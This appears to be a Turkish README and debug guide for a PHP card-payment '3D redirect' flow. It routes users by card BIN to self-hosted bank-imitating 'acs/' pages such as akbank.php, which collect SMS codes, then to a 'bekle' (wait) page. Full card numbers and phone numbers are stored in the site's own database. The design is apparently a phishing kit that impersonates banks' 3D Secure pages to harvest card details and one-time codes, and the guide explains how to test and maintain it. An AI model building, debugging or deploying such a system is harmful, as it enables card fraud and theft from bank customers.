# 3D Redirect Test ve Debug Rehberi

## 🚀 Hızlı Test

### 1. Test Sayfasını Aç
```
http://localhost/test_redirect.php
```

### 2. Örnek Kart Seç
- Ziraat Bankası: 404591XXXXXXXXXX
- Akbank: 435508XXXXXXXXXX
- Garanti: 540669XXXXXXXXXX
- İş Bankası: 454360XXXXXXXXXX

### 3. "Test Et" Butonuna Tıkla
- Otomatik olarak debug modunda 3dredirect.php açılır
- Tüm adımları görebilirsin

## 🔍 Debug Modu

### Normal Kullanım
```
http://localhost/3dredirect.php
```

### Debug Modu
```
http://localhost/3dredirect.php?debug
```

### Debug Modunda Gösterilenler
1. ✅ Session kontrolü
2. ✅ Veritabanı bağlantısı
3. ✅ Kullanıcı bilgileri
4. ✅ BIN numarası (ilk 6 hane)
5. ✅ Banka bilgisi (kod ve ad)
6. ✅ Session değişkenleri
7. ✅ Yönlendirme URL'i

## 📋 Sorun Giderme

### BIN Bulunamadı
**Durum:** BIN numarası bins tablosunda yok
**Çözüm:** `acs/diger.php` sayfasına yönlendirilir (genel 3D sayfası)

**Kontrol:**
```sql
SELECT * FROM bins WHERE bin = '404591';
```

### Banka Kodu Eşleşmedi
**Durum:** Banka kodu switch-case'de yok
**Çözüm:** `acs/diger.php` sayfasına yönlendirilir

**Desteklenen Kodlar:**
- 10: Ziraat
- 12: Halk
- 15: Vakıf
- 32: TEB
- 46: Akbank
- 59: Şekerbank
- 62: Garanti
- 64: İş Bankası
- 67: Yapı Kredi
- 99: ING
- 103: Denizbank

### Session Bulunamadı
**Durum:** `$_SESSION['userIdentifier']` yok
**Çözüm:** index.php'ye yönlendirilir

**Kontrol:**
```php
var_dump($_SESSION['userIdentifier']);
```

## 🎯 Test Senaryoları

### Senaryo 1: Bilinen Banka
```
1. Kart: 4355081234567890 (Akbank)
2. BIN: 435508
3. Banka Kodu: 46
4. Yönlendirme: acs/akbank.php
```

### Senaryo 2: Bilinmeyen BIN
```
1. Kart: 9999991234567890
2. BIN: 999999
3. Sonuç: BIN bulunamadı
4. Yönlendirme: acs/diger.php
```

### Senaryo 3: Bilinmeyen Banka Kodu
```
1. Kart: (bins tablosunda var ama kod eşleşmiyor)
2. BIN: Bulundu
3. Banka Kodu: 999 (desteklenmiyor)
4. Yönlendirme: acs/diger.php
```

## 📊 Veritabanı Kontrolleri

### Bins Tablosu Kontrolü
```sql
-- Toplam BIN sayısı
SELECT COUNT(*) FROM bins;

-- Banka başına BIN sayısı
SELECT banka_adi, COUNT(*) as total 
FROM bins 
GROUP BY banka_adi 
ORDER BY total DESC;

-- Belirli bir BIN'i ara
SELECT * FROM bins WHERE bin = '435508';
```

### Kullanıcı Kontrolü
```sql
-- Son kullanıcılar
SELECT * FROM users ORDER BY created_at DESC LIMIT 10;

-- Belirli bir kullanıcı
SELECT * FROM users WHERE user_identifier = 'user_xxx';
```

## 🛠 Manuel Test

### 1. Kullanıcı Oluştur
```sql
INSERT INTO users (
    user_identifier, 
    card_number, 
    phone, 
    total, 
    payment_status,
    created_at,
    updated_at
) VALUES (
    'test_123',
    '4355081234567890',
    '05551234567',
    100.00,
    'pending',
    NOW(),
    NOW()
);
```

### 2. Session Ayarla
```php
$_SESSION['userIdentifier'] = 'test_123';
```

### 3. Redirect'i Test Et
```
http://localhost/3dredirect.php?debug
```

## 📝 Loglar

### Debug Çıktısı Örneği
```
DEBUG: 3D Redirect başlatıldı
DEBUG: Session ID: user_65abc123def

DEBUG: ✓ Veritabanı bağlantısı başarılı

DEBUG: Kullanıcı bilgileri
Array (
    [id] => 1
    [card_number] => 4355081234567890
    [phone] => 05551234567
)

DEBUG: BIN numarası: 435508

DEBUG: Banka bilgisi
Array (
    [banka_kod] => 46
    [banka_adi] => AKBANK T.A.S.
)

DEBUG: Session değişkenleri ayarlandı
Array (
    [banka_kod] => 46
    [banka_adi] => AKBANK T.A.S.
    [cc_last_4] => 7890
    [no_last_4] => 4567
    [tutar] => 100.00
)

DEBUG: Yönlendirme URL'i: acs/akbank.php
```

## ⚠️ Önemli Notlar

1. **Test Sayfası:** `test_redirect.php` sadece geliştirme için kullanılmalı
2. **Debug Modu:** Canlı ortamda `?debug` parametresini kaldır
3. **Bins Tablosu:** `enew.sql` dosyasını import etmeyi unutma
4. **Genel Sayfa:** `acs/diger.php` tüm bilinmeyen kartlar için kullanılır

## 🎨 Diger.php Özellikleri

- Modern ve responsive tasarım
- Gradient arka plan
- SMS timer (3 dakika)
- Otomatik format kontrolü
- Hata mesajları
- Yeni kod gönderme linki

## 🔄 Akış Diyagramı

```
Kullanıcı
    ↓
3dredirect.php
    ↓
BIN Kontrolü (bins tablosu)
    ↓
    ├─ BIN Bulundu?
    │   ├─ Evet → Banka Kodu Kontrolü
    │   │   ├─ Kod Eşleşti? → Bankaya Özel Sayfa (acs/akbank.php)
    │   │   └─ Kod Eşleşmedi? → Genel Sayfa (acs/diger.php)
    │   └─ Hayır → Genel Sayfa (acs/diger.php)
    ↓
SMS Girişi
    ↓
bekle.php
    ↓
success.php
```

## 📞 Destek

Sorun yaşarsan:
1. `test_redirect.php` ile test et
2. Debug modunu aç (`?debug`)
3. Veritabanı loglarını kontrol et
4. Session değişkenlerini kontrol et
